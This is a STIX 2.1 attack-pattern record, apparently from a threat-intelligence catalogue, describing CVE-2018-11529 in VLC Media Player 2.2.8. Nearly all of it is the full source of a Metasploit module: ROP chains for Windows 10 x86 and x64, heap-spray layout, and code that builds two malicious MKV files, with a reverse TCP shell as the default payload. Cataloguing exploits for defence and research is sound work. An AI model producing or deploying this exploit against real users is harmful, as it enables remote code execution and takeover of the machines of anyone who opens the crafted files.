{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0555622-6b0d-4791-b415-3c8ee2289c91",
    "created": "2024-08-14T16:37:59.998605Z",
    "modified": "2024-08-14T16:37:59.99861Z",
    "name": "VLC Media Player MKV Use After Free",
    "description": "( This module exploits a use after free vulnerability in VideoLAN VLC =< 2.2.8. The vulnerability exists in the parsing of MKV files and affects both 32 bits and 64 bits.  In order to exploit this, this module will generate two files: The first .mkv file contains the main vulnerability and heap spray the second .mkv file is required in order to take the vulnerable code path and should be placed under the same directory as the .mkv file.  This module has been tested against VLC v2.2.8. Tested with payloads windows/exec, windows/x64/exec, windows/shell/reverse_tcp windows/x64/shell/reverse_tcp. Meterpreter payloads if used can cause the application to crash instead. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vlc_mkv.rb",
            "external_id": "vlc_mkv.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-11529"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VLC Media Player MKV Use After Free',\n      'Description'    => %q(\n          This module exploits a use after free vulnerability in\n        VideoLAN VLC =< 2.2.8. The vulnerability exists in the parsing of\n        MKV files and affects both 32 bits and 64 bits.\n\n          In order to exploit this, this module will generate two files:\n        The first .mkv file contains the main vulnerability and heap spray,\n        the second .mkv file is required in order to take the vulnerable code\n        path and should be placed under the same directory as the .mkv file.\n\n          This module has been tested against VLC v2.2.8. Tested with payloads\n        windows/exec, windows/x64/exec, windows/shell/reverse_tcp,\n        windows/x64/shell/reverse_tcp. Meterpreter payloads if used can\n        cause the application to crash instead.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'Eugene Ng - GovTech',      # Vulnerability Discovery, Exploit\n        'Winston Ho - GovTech',     # Metasploit Module\n      ],\n      'References'     =>\n        [\n          ['CVE', '2018-11529'],\n          ['EDB', '44979']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 0x300,\n          'DisableNops'    => true\n        },\n      'Platform'       => 'win',\n      'Targets'        => [\n        [\n          'VLC 2.2.8 on Windows 10 x86',\n          {\n            'Platform' => 'win',\n            'Arch' => [ARCH_X86],\n            'Ret' => 0x22000020,\n            'ExitPointer' => 0x00411364,\n            'DefaultOptions' => {'PAYLOAD' => 'windows/shell/reverse_tcp'},\n            'RopChain' => [\n              0x0040ae91,             # XCHG EAX,ESP # ADD BYTE PTR [ECX],AL # MOV EAX,DWORD PTR [EAX] # RET\n              0x00407086,             # POP EDI # RETN [vlc.exe]\n              0x00000040,             # 0x00000040-> edx\n              0x0040b058,             # MOV EDX,EDI # POP ESI # POP EDI # POP EBP # RETN [vlc.exe]\n              0x41414141,             # Filler (compensate)\n              0x41414141,             # Filler (compensate)\n              0x41414141,             # Filler (compensate)\n              0x004039c7,             # POP EAX # POP ECX # RETN [vlc.exe]\n              0x22000030,             # Filler (compensate) for rol [eax] below\n              0x41414141,             # Filler (compensate)\n              0x004039c8,             # POP ECX # RETN [vlc.exe]\n              0x0041193d,             # &Writable location [vlc.exe]\n              0x00409d18,             # POP EBX # RETN [vlc.exe]\n              0x00000201,             # 0x00000201-> ebx\n              0x0040a623,             # POP EBP # RETN [vlc.exe]\n              0x0040a623,             # POP EBP # RETN [vlc.exe]\n              0x004036CB,             # POP ESI # RETN [vlc.exe]\n              0x0040848c,             # JMP ds:[EAX * 4 + 40e000] [vlc.exe]\n              0x00407086,             # POP EDI # RETN [vlc.exe]\n              0x0040ae95,             # MOV EAX,DWORD PTR [EAX] # RETN [vlc.exe]\n              0x0040af61,             # PUSHAD # ROL BYTE PTR [EAX], 0FFH # LOOPNE VLC+0XAEF8 (0040AEF8)\n              0x22000020 + 0x5e0,     # Shellcode\n            ]\n          }\n        ],\n        [\n          'VLC 2.2.8 on Windows 10 x64',\n          {\n            'Platform' => 'win',\n            'Arch' => [ARCH_X64],\n            'Ret' => 0x40000040,\n            'ExitPointer' => 0x00412680,\n            'DefaultOptions' => {'PAYLOAD' => 'windows/x64/shell/reverse_tcp'},\n            'RopChain' => [\n              0x004037ac,             # XCHG EAX,ESP # ROL BL,90H # CMP WORD PTR [RCX],5A4DH # JE VLC+0X37C0 (00000000`004037C0) # XOR EAX,EAX # RET\n              0x00403b60,             # POP RCX # RET\n              0x40000040,             # lpAddress\n              0x004011c2,             # POP RDX # RET\n              0x00001000,             # dwSize\n              0x0040ab70,             # JMP VirtualProtect\n              0x40000040 + 0x700,     # Payload\n            ]\n          }\n        ]\n      ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2018-05-24',\n      'DefaultTarget'  => 1))\n\n    register_options [\n      OptString.new('MKV_ONE', [false, 'mkv that should be opened', '']),\n      OptString.new('MKV_TWO', [false, 'The auxiliary file name.', ''])\n    ]\n\n    deregister_options('FILENAME')\n  end\n\n  def to_bytes(num, length, endianess = 'big')\n    h = format('%<num>x', num: num)\n    s = ('0' * (h.length % 2) + h).rjust(length * 2)\n    s = s.scan(/.{2}/).map! { |x| x.hex.chr }.join\n    endianess == 'big' ?  s : s.reverse\n  end\n\n  def data_size(number, numbytes = (1...9))\n    # encode 'number' as an EBML variable-size integer.\n    numbytes = [numbytes] if numbytes.is_a?(Integer)\n    numbytes.each do |size|\n      bits = size * 7\n      return to_bytes(((1 << bits) + number), size) if number <= (1 << bits) - 2\n    end\n    fail_with(Failure::BadConfig, \"Can't store #{number} in #{size} bytes\")\n  end\n\n  def build_data(size)\n    block_size = 0x1000\n\n    if target.arch.first == ARCH_X64\n      target_address_packed = [target.ret].pack(\"Q<\")\n      rop_chain = target['RopChain'].map { |qword| [qword].pack(\"Q<\") }.join\n\n      if size == 0x180\n        uaf_object = \"\\x41\" * size\n        uaf_object[0x30, 8] = target_address_packed\n        uaf_object[0x38, 8] = [target.ret + 0x10000].pack(\"Q<\")\n        uaf_object[0x168, 8] = [target.ret + 0x3c0].pack(\"Q<\")\n        uaf_object[0x170, 8] = target_address_packed\n        return uaf_object\n      else\n        block = \"\\x00\" * block_size\n        block[0x0, 4] = \"\\x41\" * 4\n        block[0x8, target_address_packed.length] = target_address_packed\n        block[0x10, target_address_packed.length] = target_address_packed\n\n        block[0x40, 8] = [0x1].pack(\"Q<\")\n        block[0x58, 8] = [target.ret + 0x3a8].pack(\"Q<\")\n        block[0xE4, 8] = [0x1].pack(\"Q<\")\n\n        block[0x1b8, 8] = [target.ret + 0x80].pack(\"Q<\")\n        block[0x3b8, rop_chain.length] = rop_chain\n\n        block[0x6d8, 8] = [target.ret + 0x10].pack(\"Q<\")\n        block[0x700, payload.encoded.length] = payload.encoded\n\n        block *= size / block.length + 1\n      end\n      return block[0, size]\n    elsif target.arch.first == ARCH_X86\n      target_address_packed = [target.ret].pack(\"I<\")\n      rop_chain = target['RopChain'].map { |dword| [dword].pack(\"I<\") }.join\n\n      if size == 0x100\n        uaf_object = \"\\x41\" * size\n        uaf_object[0x28, 4] = target_address_packed\n        uaf_object[0x2c, 4] = [target.ret + 0x10000].pack(\"I<\")\n        uaf_object[0xf4, 4] = [target.ret + 0x2bc].pack(\"I<\")\n        uaf_object[0xf8, 4] = target_address_packed\n        return uaf_object\n      else\n        block = \"\\x00\" * block_size\n        block[0x0, 4] = [0x22000040].pack(\"I<\")\n        block[0x4, target_address_packed.length] = target_address_packed\n        block[0x8, target_address_packed.length] = target_address_packed\n\n        block[0x10, 4] = [0xc85].pack(\"I<\")\n        block[0x30, 4] = [0x1].pack(\"I<\")\n        block[0xc0, 4] = [0x1].pack(\"I<\")\n\n        block[0x194, 4] = [0x2200031c].pack(\"I<\")\n        block[0x2c0, 4] = [0x220002e4].pack(\"I<\")\n        block[0x2f4, 4] = [0x22000310].pack(\"I<\")\n\n        block[0x2f8, rop_chain.length] = rop_chain\n        block[0x564, 4] = [0x22000588].pack(\"I<\")\n        block[0x5e0, payload.encoded.length] = payload.encoded\n\n        block *= size / block.length + 1\n      end\n      return block[0, size]\n    end\n  end\n\n  def generate_mkv\n    # EBML Header\n    doc_type = \"\\x42\\x82\" << data_size(8) << \"matroska\"\n    ebml = \"\\x1a\\x45\\xdf\\xa3\" << data_size(doc_type.length) << doc_type\n\n    # Seek Entries\n    seek_entry = \"\\x53\\xab\" << data_size(4)                                  # SeekID\n    seek_entry << \"\\x15\\x49\\xa9\\x66\"                                         # KaxInfo\n    seek_entry << \"\\x53\\xac\" << data_size(2) << \"\\xff\" * 2                   # SeekPosition + Index of Segment info\n    seek_entries = \"\\x4d\\xbb\" << data_size(seek_entry.length) << seek_entry  # Seek Entry\n\n    seek_entry = \"\\x53\\xab\" << data_size(4)                                  # SeekID\n    seek_entry << \"\\x11\\x4d\\x9b\\x74\"                                         # KaxSeekHead\n    seek_entry << \"\\x53\\xac\" << data_size(4) << \"\\xff\" * 4                   # SeekPosition + Index of SeekHead\n    seek_entries << \"\\x4d\\xbb\" << data_size(seek_entry.length) << seek_entry # Seek Entry\n\n    seek_entry = \"\\x53\\xab\" << data_size(4)                                  # SeekID\n    seek_entry << \"\\x10\\x43\\xa7\\x70\"                                         # KaxChapters\n    seek_entry << \"\\x53\\xac\" << data_size(4) << \"\\xff\" * 4                   # SeekPosition + Index of Chapters\n    seek_entries << \"\\x4d\\xbb\" << data_size(seek_entry.length) << seek_entry # Seek Entry\n\n    # SeekHead\n    seek_head = \"\\x11\\x4d\\x9b\\x74\" << data_size(seek_entries.length) << seek_entries\n\n    # Void\n    void = \"\\xec\" << data_size(2) << \"\\x41\" # Trigger bug with an out-of-order element\n\n    # Info\n    segment_uid = \"\\x73\\xa4\" << data_size(16) << rand_text(16)\n    info = \"\\x15\\x49\\xa9\\x66\" << data_size(segment_uid.length) << segment_uid\n\n    # Chapters\n    chapter_segment_uid = \"\\x6e\\x67\" << data_size(16) << rand_text(16)\n    chapter_atom = \"\\xb6\" << data_size(chapter_segment_uid.length) << chapter_segment_uid\n    edition_entry = \"\\x45\\xb9\" << data_size(chapter_atom.length) << chapter_atom\n    chapters = \"\\x10\\x43\\xa7\\x70\" << data_size(edition_entry.length) << edition_entry\n\n    if target.arch.first == ARCH_X86\n      size = 0x100\n      count = 30\n    elsif target.arch.first == ARCH_X64\n      size = 0x180\n      count = 60\n    end\n\n    # Attachments\n    attached_files = \"\"\n    mime = \"\\x46\\x60\" << data_size(24) << \"application/octet-stream\"\n    data = build_data(size)\n    data = \"\\x46\\x5c\" << data_size(data.length) << data\n    500.times do\n      uid = \"\\x46\\xae\" << data_size(8) << rand_text(8)\n      file_name = \"\\x46\\x6e\" << data_size(8) << rand_text(8)\n      header = \"\\x61\\xa7\" << data_size(uid.length + file_name.length + mime.length + data.length)\n\n      attached_files << header << file_name << mime << uid << data\n    end\n    attachments = \"\\x19\\x41\\xa4\\x69\" << data_size(attached_files.length) << attached_files\n\n    # Cluster\n    pay_load = build_data(0xfff000)\n    # Since the payload is simply repeated payload blocks appended to cluster then segment_data,\n    # we return the simple_block and the count to process later instead.\n    # This should result is overall lowered memory usage during payload generation\n    simple_block = \"\\xa3\" << data_size(pay_load.length) << pay_load\n    simple_blocks_len = simple_block.length * count\n    time_code = \"\\xe7\" << data_size(1) << \"\\x00\"\n    cluster = \"\\x1f\\x43\\xb6\\x75\" << data_size(time_code.length + simple_blocks_len) << time_code\n\n    # Concatenate everything\n    segment_data = seek_head << void << info << chapters << attachments << cluster\n    segment = \"\\x18\\x53\\x80\\x67\" << data_size(segment_data.length + simple_blocks_len) << segment_data\n    mkv = ebml << segment\n\n    return mkv, simple_block, count\n  end\n\n  def exploit\n    mkv1, simple_block, count = generate_mkv\n    mkv2 = mkv1[0, 0x4f] + \"\\x15\\x49\\xa9\\x66\" + data_size(10)\n\n    tmpname = rand_text_alpha_lower(3..8)\n    f1 = datastore['MKV_ONE'].empty? ? \"#{tmpname}-part1.mkv\" : datastore['MKV_ONE']\n    f1 << '.mkv' unless f1.downcase.end_with?('.mkv')\n\n    f2 = datastore['MKV_TWO'].empty? ? \"#{tmpname}-part2.mkv\" : datastore['MKV_TWO']\n    f2 << '.mkv' unless f2.downcase.end_with?('.mkv')\n\n    file_format_filename(f1)\n    file_create(mkv1)\n    print_status(\"Created #{f1}. Target should open this file\")\n\n    file_format_filename(f2)\n    file_create(mkv2)\n    print_status(\"Created #{f2}. Put this file in the same directory as #{f1}\")\n\n    print_status(\"Appending blocks to #{f1}\")\n    path = File.join(Msf::Config.local_directory, f1)\n    full_path = ::File.expand_path(path)\n    File.open(full_path, 'ab') do |fd|\n      count.times { fd.write(simple_block) }\n    end\n    print_good(\"Succesfully appended blocks to #{f1}\")\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-24",
    "x_mitre_platforms": [
        "win'"
    ]
}